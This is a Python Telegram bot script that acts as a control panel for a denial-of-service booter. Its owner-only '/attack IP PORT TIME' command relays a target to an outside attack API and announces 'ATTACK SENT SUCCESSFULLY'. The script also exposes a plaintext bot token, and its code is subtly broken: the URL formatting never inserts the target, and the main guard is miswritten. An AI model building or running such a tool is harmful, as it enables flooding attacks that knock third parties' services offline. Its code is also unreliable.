import telebot
import requests
import datetime

# ================= CONFIGURATION =================
BOT_TOKEN = "8636170661:AAH8ELBjXm2B-Z4ZTBj8fMhmZNlsvK2wE5o"
OWNER_ID = 6261183184  # ADD_YOUR_ID_HERE
CHANNEL_ID = "@Grootcrackzz"
API_URL = "https://api-u13n.onrender.com"
# =================================================

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start_cmd(m):
    welcome_text = (
        f"🚀 SeNsI9051 VPS EDITION 🚀\n\n"
        f"Status: ONLINE (Full Power)\n"
        f"Channel: {CHANNEL_ID}\n\n"
        f"Commands:\n"
        f"🔹 /attack <IP> <PORT> <TIME>\n"
        f"🔹 /id - Get your unique ID"
    )
    bot.reply_to(m, welcome_text, parse_mode="Markdown")

@bot.message_handler(commands=['attack'])
def attack_cmd(m):
    if m.from_user.id != OWNER_ID:
        bot.reply_to(m, "❌ Access Denied! You are not authorized.")
        return

    parts = m.text.split()
    if len(parts) != 4:
        bot.reply_to(m, "⚠️ Format: /attack <IP> <PORT> <TIME>")
        return

    ip, port, duration = parts[1], parts[2], parts[3]
    
    # User ko update dena
    bot.send_message(m.chat.id, 
        f"💥 ATTACK SENT SUCCESSFULLY! 💥\n\n"
        f"🎯 Target: {ip}:{port}\n"
        f"🕒 Time: {duration}s\n"
        f"📡 Server: VPS-HIGH-SPEED", 
        parse_mode="Markdown")

    try:
        # Requesting the local API engine
        requests.get(API_URL.format(ip=ip, port=port, time=duration), timeout=1)
    except:
        pass

if name == 'main':
    print(f"[{datetime.datetime.now()}] SeNsI9051 Bot Started on VPS...")
    bot.polling(none_stop=True)
